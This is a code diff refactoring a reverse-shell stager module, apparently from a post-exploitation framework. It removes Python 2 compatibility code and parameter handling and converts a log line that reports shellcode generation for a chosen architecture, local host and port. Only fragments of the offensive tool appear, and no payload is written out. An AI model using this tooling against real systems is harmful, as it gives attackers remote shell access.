@@ -1,14 +1,11 @@
-from __future__ import print_function
-
 import logging
 import subprocess
-from builtins import object
 
 log = logging.getLogger(__name__)
 
 
-class Stager(object):
-    def __init__(self, mainMenu, params=[]):
+class Stager:
+    def __init__(self, mainMenu):
         self.info = {
             "Name": "Stage 0 - Reverse Shell",
             "Authors": [
@@ -60,11 +57,6 @@ class Stager(object):
 
         self.main_menu = mainMenu
 
-        for param in params:
-            option, value = param
-            if option in self.options:
-                self.options[option]["Value"] = value
-
     def generate(self):
         arch = self.options["Arch"]["Value"]
         lhost = self.options["LocalHost"]["Value"]
@@ -76,8 +68,7 @@ class Stager(object):
 
     def generate_shellcode(self, lhost, lport, msf_format, arch):
         log.info(
-            "[*] Generating Shellcode %s with lhost %s and lport %s"
-            % (arch, lhost, lport)
+            f"[*] Generating Shellcode {arch} with lhost {lhost} and lport {lport}"
         )
 
         if arch == "x64":
